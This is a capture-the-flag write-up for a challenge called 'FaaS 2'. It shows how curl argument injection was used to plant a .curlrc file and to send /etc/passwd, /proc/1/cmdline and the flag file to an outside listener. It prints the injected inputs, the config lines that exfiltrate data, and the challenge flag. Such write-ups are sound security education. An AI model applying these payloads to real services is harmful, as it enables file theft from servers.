# FaaS 2

<img width="480" height="535" alt="image" src="https://github.com/user-attachments/assets/e2ededae-6002-47cb-be1c-1b2436901f01" />

## Summary

The service accepted a host, fetched it with `curl`, and displayed the page title. Although direct command injection was filtered, spaces were preserved, which allowed extra curl arguments to be injected. I used `-o` to plant a persistent curl configuration, leaked PID 1's command line to discover the randomized flag filename, and then uploaded that file to my listener.

## Initial analysis

The important behavior was that the submitted host was incorporated into a curl command without being kept as one argument. A simple request such as the following proved that curl options could be appended:

```text
webhook.site/<id> -d @/etc/passwd
```

The webhook received `/etc/passwd`, confirming arbitrary reads of known paths. This was argument injection rather than shell command injection: I could use curl's own options, but could not simply append `; cat ...`.

The flag itself was not at a predictable path. The container startup command read a randomly named file in `/srv`, so the remaining problem was learning that filename. Direct attempts to upload `/proc/1/cmdline` were blocked by the input filter, and its NUL-separated contents also made normal form submission inconvenient.

## Planting a curl configuration

Curl automatically reads `$HOME/.curlrc`. The `-o` option was accepted, so I hosted a small configuration file and made the vulnerable curl process save it as `/home/chall/.curlrc`.

The first configuration was:

```text
data-urlencode = "@/proc/1/cmdline"
url = "http://<listener>/recv"
```

Conceptually, the injected request was:

```text
<attacker-host>/flagcfg -o /home/chall/.curlrc
```

This bypassed the path filter because `/proc/1/cmdline` never appeared in the submitted challenge input; it was only present in the downloaded configuration. On the next invocation, curl loaded `.curlrc` automatically and sent the process command line to my listener. `data-urlencode` was important because it safely encoded the embedded NUL bytes.

After URL-decoding the received body, PID 1 contained:

```text
./secretbinary1337 `cat what_even_is_this_file_name.txt`
```

That disclosed the actual flag path:

```text
/srv/what_even_is_this_file_name.txt
```

## Exfiltrating the flag

I replaced `.curlrc` using the same `-o` primitive. The second configuration read the newly discovered path:

```text
data = "@/srv/what_even_is_this_file_name.txt"
url = "http://<listener>/flag"
```

One final request caused curl to load this configuration and POST the file contents. The listener received:

```text
scriptCTF{bru73f0rc1ng_pr0c3ss_1d5????_167be07c6e95}
```

The four question marks are literal characters in the flag.

## Flag

```text
scriptCTF{bru73f0rc1ng_pr0c3ss_1d5????_167be07c6e95}
```
